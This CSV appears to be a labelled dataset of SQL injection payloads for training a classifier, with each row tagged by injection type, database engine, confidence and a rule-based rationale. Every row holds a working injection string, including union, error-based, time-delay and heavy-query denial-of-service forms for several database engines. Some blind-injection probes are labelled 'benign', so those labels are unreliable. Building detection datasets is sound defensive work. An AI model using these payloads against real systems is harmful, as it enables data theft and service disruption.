id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23358,"1%"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""%"" = """,heavy_query,generic,0.80,Rule: large number (500000000) in repeat() → heavy_query (P4); Heuristic secondary on boolean; DoS-style payload detected; Generic DB assigned,1
23359,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",error_based,mysql,0.85,Rule secondary: elt() boolean (P3); large overflow constant detected → heavy_query feature; MySQL concat/elt pattern indicates error vector,1
23360,"1'+ ( select 'vddk' where 6961 = 6961,",boolean_blind,generic,0.75,Rule secondary: boolean comparison (6961=6961) → boolean_blind (P3); No explicit union detected; Generic DB for simple condition,1
23361,"-2790"" ) ) as vcvw where 6075 = 6075 or 7078 = 8148--",boolean_blind,generic,0.85,Rule: 'or 7078 = 8148' → boolean_blind (P3); Both sources confirm boolean condition; Generic DB for comparison pattern,2
23362,"1'|| ( select 'dukt' where 3206 = 3206 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",boolean_blind,generic,0.80,Rule: boolean condition + large cartesian join (7 table aliases); Heavy_query secondary; Generic DB - ambiguous MS-SQL vs Generic syntax,1
23363,"1 where 6500 = 6500",benign,generic,0.65,Rule: no SQLi signal detected; Heuristic confirms benign; Simple WHERE clause with true condition only; Generic DB,2
23364,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'zdkn' = 'zdkn",boolean_blind,generic,0.80,Rule secondary: boolean + Cartesian join pattern; Heavy_query (P4) feature with multiple table aliases; Generic DB signature,1
23365,"1%' ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.90,Rule: 'waitfor delay' → time_blind (P5) MSSQL-specific; Both sources confirm time-based signal; MSSQL DB engine detected,2
23366,"-7138"" union all select 2341,2341,2341,2341--",union_based,generic,0.90,Rule: 'union all select' → union_based (P7); Heuristic confirms UNION structure; Generic DB for numeric payload,2
23367,"1'+ ( select wpbj where 1849 = 1849,",boolean_blind,generic,0.75,Rule secondary: boolean condition; No UNION keyword detected; Generic DB for simple comparison pattern,1
23368,"iif ( 6369 = 5881,1,1/0 )",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; IIF conditional without sleep/time signal; Generic DB,2
23369,"1'|| ( select 'yucg' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||'",error_based,oracle,0.90,Rule: xmltype() → error_based (P4) Oracle; Both sources confirm; XML casting error signal with chr() encoding; Oracle DB signature,2
23370,"1'+ ( select 'hrxp' where 5948 = 5948,",boolean_blind,generic,0.75,Rule secondary: boolean condition (5948=5948); No explicit union detected; Generic DB for simple WHERE clause,1
23371,"select ( case when ( 9103 = 9836 ) then 9103 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",boolean_blind,oracle,0.85,Rule: boolean_blind secondary (P3) on CASE structure; Heuristic secondary: division by zero error; Oracle DB from dual,1
23372,"1 ) ) as vrev where 4248 = 4248 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,mysql,0.90,Rule: updatexml() → error_based (P4) MySQL; Both sources confirm error function; XPath injection pattern detected,2
23373,"1' ) where 5925 = 5925 union all select null,null,null,null,null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB for NULL payload,2
23374,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) -- nqdb",error_based,mysql,0.85,Rule secondary: exp() overflow error (P4) MySQL; Both sources confirm error vector; Complex nested concat/elt structure,1
23375,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) +'",time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle-specific; Both sources confirm time-based signal; Oracle DB engine,2
23376,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'ggcm' like 'ggcm",heavy_query,generic,0.85,Rule secondary: large number (5000000000) in repeat() → heavy_query (P4); Boolean secondary; Generic DB for DoS-style payload,1
23377,"1' where 2183 = 2183",benign,generic,0.65,Rule: no attack signal; Heuristic confirms benign; Simple WHERE true condition only; Generic DB,2
23378,"1%"" ) ) order by 1--",benign,generic,0.70,Rule: no SQLi attack signal detected; ORDER BY alone insufficient for injection classification; Generic DB,2
23379,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'bzxo' like 'bzxo",time_blind,sqlite,0.85,Rule: randomblob() → time_blind (P5) SQLite; 7+ digit number pattern; Large blob allocation for time delay; SQLite DB signature,1
23380,"-5250 ) where 1591 = 1591 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.85,Rule secondary: boolean (P3) + Firebird-specific table rdb$database; Cartesian pattern absent; Firebird DB detected,1
23381,"1"" ) where 3058 = 3058 union all select null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB for NULL payload,2
23382,"1' where 1895 = 1895 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with 5-way Cartesian join on all_users (Oracle); Boolean secondary; Oracle DB,1
23383,"1"" ) ) rlike ( select ( case when ( 5342 = 1036 ) then 1 else 0x28 end ) ) and ( ( ""ntdz"" like ""ntdz",boolean_blind,mysql,0.85,Rule secondary: boolean_blind (P3) on RLIKE; Both sources confirm; MySQL RLIKE boolean pattern; MySQL DB engine,2
23384,"1%"" or sleep ( 5 ) and ""%"" = """,time_blind,mysql,0.90,Rule: sleep() → time_blind (P5) MySQL; Both sources confirm time-based signal; MySQL DB signature,2
23385,"1%"" ) ) union all select null,null,null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB for basic union,2
23386,"1, ( case when 2872 = 2872 then 1 else null end )",benign,generic,0.70,Rule: no SQLi signal detected; CASE expression for conditional logic only; Generic DB - no attack vector,2
23387,"1 ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 1402 = 1402",heavy_query,generic,0.85,Rule secondary: large number (500000000) → heavy_query (P4); Boolean secondary; Generic DB for DoS-style payload,1
23388,"1"" ) where 3727 = 3727 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.80,Rule secondary: boolean + convert() function; MSSQL-style char() encoding; Generic DB - ambiguous between MSSQL/generic,1
23389,"1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'trzi' = 'trzi",boolean_blind,mysql,0.85,Rule secondary: boolean_blind (P3) on RLIKE; Both sources confirm; MySQL RLIKE boolean pattern; MySQL DB,2
23390,"-4135"" ) as leiz where 3582 = 3582 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.90,Rule: xmltype() → error_based (P4) Oracle; Both sources confirm; XML casting error signal; Oracle DB,2
23391,"1' ) where 5331 = 5331",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Simple WHERE true condition; Generic DB,2
23392,"1 and make_set ( 6911 = 1867,1867 )",benign,generic,0.70,Rule: no attack signal detected; make_set() is MySQL function for set operations; Generic DB,2
23393,"-7971 ) ) as armw where 9474 = 9474 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.75,Rule secondary: boolean (P3) + make_set(); Boolean condition detected; Generic DB for conditional pattern,1
23394,"1' ) ) as xqam where 6750 = 6750",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Generic DB - simple WHERE clause,2
23395,"waitfor delay '0:0:5' and ( ( ""ykgm"" = ""ykgm",time_blind,mssql,0.90,Rule: waitfor delay → time_blind (P5) MSSQL; Both sources confirm time-based signal; MSSQL DB engine,2
23396,"1"" ) where 3727 = 3727",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Simple WHERE clause; Generic DB,2
23397,"-1483' or make_set ( 9354 = 9354,7185 ) and 'qfil' = 'qfil",benign,generic,0.70,Rule: no SQLi signal detected; make_set() MySQL conditional only; Generic DB,2
23398,"1%"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""%"" = """,heavy_query,mysql,0.85,Rule secondary: heavy_query (P4) with cartesian join and nested selects; Heuristic: elt() boolean; MySQL DB from concat/rand patterns,1
23399,"1' ) ) ) and 9198 = 9198--",boolean_blind,generic,0.85,Rule: 'and 9198 = 9198' → boolean_blind (P3); Both sources confirm boolean condition; Generic DB,2
23400,"1' ) as rvli where 4427 = 4427",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Simple WHERE clause; Generic DB,2
23401,"1' ) ) as wdor where 7426 = 7426",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Simple WHERE clause; Generic DB,2
23402,"-7016%"" ) ) union all select 8847,8847,8847--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB,2
23403,"-8124 ) union all select 7251,7251,7251#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB,2
23404,"1' ) ) as uvxv where 6663 = 6663 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,firebird,0.85,Rule secondary: boolean + heavy_query; Firebird-specific domain.* tables; Cartesian join pattern; Firebird DB,1
23405,"-8838"" ) ) as xisn where 2749 = 2749 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.80,Rule secondary: boolean (P3) + PostgreSQL cast to numeric; ::text operator indicates PostgreSQL; Generic DB in sources,1
23406,"1%' ) and 9226 = 7542--",boolean_blind,generic,0.85,Rule: 'and 9226 = 7542' → boolean_blind (P3); Both sources confirm boolean; Generic DB,2
23407,"-2803' ) as jciy where 1130 = 1130 or make_set ( 4599 = 6550,6550 ) --",boolean_blind,generic,0.75,Rule secondary: boolean + make_set(); Boolean condition pattern; Generic DB,1
23408,"-7258 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",heavy_query,generic,0.85,Rule secondary: large cartesian group by with HAVING clause; Heavy_query (P4) with MySQL concat/rand; Generic DB,1
23409,"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.75,Rule secondary: boolean + make_set(); Boolean condition; Generic DB,1
23410,"1 ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 3977 = 3977",error_based,mysql,0.85,Rule secondary: exp() overflow → error_based (P4) MySQL; Both sources confirm error vector; MySQL concat/elt pattern,1
23411,"-3930%"" ) ) order by 1#",benign,generic,0.70,Rule: no SQLi signal; ORDER BY alone insufficient; Generic DB,2
23412,"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'qdij' = 'qdij",boolean_blind,generic,0.80,Rule secondary: boolean + MSSQL convert(); Boolean condition + type casting; Generic DB - ambiguous MSSQL/generic,1
23413,"1%"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,heavy_query,db2,0.85,Rule secondary: heavy_query (P4) with 3-way Cartesian join on DB2-specific sysibm.systables; DB2 DB detected,1
23414,"1 ) ) as vzgo where 6281 = 6281 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.85,Rule secondary: heavy_query (P4) with Firebird domain.* Cartesian join; Firebird DB detected,1
23415,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual#",time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle; Both sources confirm; Oracle DB engine,2
23416,"select pg_sleep ( 5 ) --",time_blind,postgresql,0.90,Rule: pg_sleep() → time_blind (P5) PostgreSQL; Both sources confirm; PostgreSQL DB engine,2
23417,"1"" ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""uzbl"" = ""uzbl",heavy_query,firebird,0.85,Rule secondary: heavy_query (P4) with 4-way Cartesian join on Firebird rdb$* tables; Firebird DB,1
23418,"1 where 8948 = 8948 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4) with MySQL cartesian subquery; Heuristic secondary: elt() boolean; MySQL DB from patterns,1
23419,"-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION structure; Generic DB,2
23420,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'txwf' = 'txwf",error_based,mysql,0.85,Rule secondary: exp() overflow → error_based (P4) MySQL; Both sources confirm error vector; MySQL pattern,1
23421,"1' ) ) ) and 7533 = 7533 and ( ( ( 'hoyw' = 'hoyw",boolean_blind,generic,0.85,Rule: 'and 7533 = 7533' → boolean_blind (P3); Both sources confirm; Generic DB,2
23422,"-1844' ) union all select 9572,9572,9572,9572#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION; Generic DB,2
23423,"1' ) and make_set ( 9961 = 6559,6559 ) and ( 'exde' = 'exde",benign,generic,0.70,Rule: no attack signal; make_set() conditional only; Generic DB,2
23424,"1 ) where 4780 = 4780",benign,generic,0.65,Rule: no SQLi signal; Heuristic confirms benign; Simple WHERE clause; Generic DB,2
23425,"-4811' ) ) ) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms UNION; Generic DB,2
23426,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""layz"" = ""layz",time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle; Both sources confirm; Oracle DB engine,2
23427,"1%"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""%"" = """,heavy_query,db2,0.85,Rule secondary: heavy_query (P4) with DB2 sysibm.systables Cartesian join; DB2 DB detected,1
23428,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'zcrh' = 'zcrh",boolean_blind,generic,0.80,Rule secondary: boolean + convert() type casting; MSSQL-style char encoding; Generic DB,1
23429,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""gzhp"" = ""gzhp",boolean_blind,firebird,0.85,Rule secondary: boolean + Firebird rdb$* Cartesian join; Firebird DB detected,1
23430,"1', ( select * from generate_series ( 2636,2636,case when ( 2636 = 7071 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.85,Rule secondary: boolean + PostgreSQL generate_series(); PostgreSQL DB signature from function; Boolean secondary,1
23431,"1 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.90,Rule: pg_sleep() → time_blind (P5) PostgreSQL; Both sources confirm; PostgreSQL DB engine,2
23432,"1%' ) ) ) union all select null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23433,"select ( case when ( 3859 = 6938 ) then 3859 else 3859* ( select 3859 from mysql.db ) end ) #",error_based,mysql,0.85,Rule secondary: CASE division/multiplication error → error_based (P4); MySQL DB from mysql.db table; MySQL DB,1
23434,"1' union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23435,"1 ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23436,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""%"" = """,time_blind,oracle,0.90,Rule: dbms_pipe.receive_message() → time_blind (P5) Oracle; Both sources confirm; Oracle DB engine,2
23437,"1 and 7533 = 7533# absp",boolean_blind,generic,0.85,Rule: 'and 7533 = 7533' → boolean_blind (P3); Both sources confirm; Generic DB,2
23438,"1'+ ( select 'xbyn' where 6881 = 6881,",boolean_blind,generic,0.75,Rule secondary: boolean condition (6881=6881); No explicit union; Generic DB,1
23439,"-7277 ) ) ) order by 1#",benign,generic,0.70,Rule: no SQLi signal; ORDER BY insufficient; Generic DB,2
23440,"1 ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Rule secondary: heavy_query (P4) with 5-way Cartesian join on Oracle all_users; Oracle DB,1
23441,"if ( 7340 = 9813 ) select 7340 else drop function yppp--",boolean_blind,generic,0.75,Rule secondary: boolean + conditional; Generic DB for IF statement pattern,1
23442,"1 ) where 2888 = 2888 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,Rule: generate_series(1,5000000) → heavy_query (P4) PostgreSQL; 7+ digit pattern; PostgreSQL DB,2
23443,"-5903%' ) union all select 8293,8293,8293,8293,8293,8293,8293,8293#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23444,"1%' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( '%' = '",error_based,mysql,0.90,Rule: extractvalue() → error_based (P4) MySQL; Both sources confirm; MySQL XPath injection pattern,2
23445,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'ufbr' = 'ufbr",heavy_query,generic,0.85,Rule secondary: large number (500000000) → heavy_query (P4); Boolean secondary; Generic DB for DoS pattern,1
23446,"-8245"" ) ) or 3038 = 3038",boolean_blind,generic,0.85,Rule: 'or 3038 = 3038' → boolean_blind (P3); Both sources confirm; Generic DB,2
23447,"1%"" ) ) ) and elt ( 9524 = 1124,1124 ) and ( ( ( ""%"" = """,benign,generic,0.70,Rule: no attack signal; elt() MySQL conditional only; Generic DB,2
23448,"iif ( 5257 = 5257,1,1/0 )",benign,generic,0.70,Rule: no SQLi signal; Heuristic confirms benign; Generic DB,2
23449,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",heavy_query,generic,0.85,Rule secondary: large number (5000000000) → heavy_query (P4); Boolean secondary; Generic DB,1
23450,"1 ) as wype where 6608 = 6608 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Rule secondary: heavy_query (P4) with DB2 sysibm.systables Cartesian join; DB2 DB,1
23451,"1%"" ) union all select null,null,null--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23452,"1%' ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Rule secondary: heavy_query (P4) with DB2 Cartesian; DB2 DB,1
23453,"-2803"" ) union all select 5337,5337,5337,5337,5337,5337,5337#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23454,"-6775"" union all select 7484,7484#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23455,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""qycx"" like ""qycx",heavy_query,mysql,0.85,Rule secondary: heavy_query (P4) with MySQL cartesian subquery; MySQL DB patterns,1
23456,"-5420' ) union all select 2508,2508,2508,2508,2508,2508,2508#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23457,"1' in boolean mode ) union all select null,null,null#",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23458,"-8760 ) where 8277 = 8277 union all select 8277--",union_based,generic,0.90,Rule: UNION SELECT → union_based (P7); Heuristic confirms; Generic DB,2
23459,"1"" ) where 1024 = 1024 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,Rule secondary: heavy_query (P4) with 7-way MSSQL sysusers Cartesian join; MSSQL DB,1
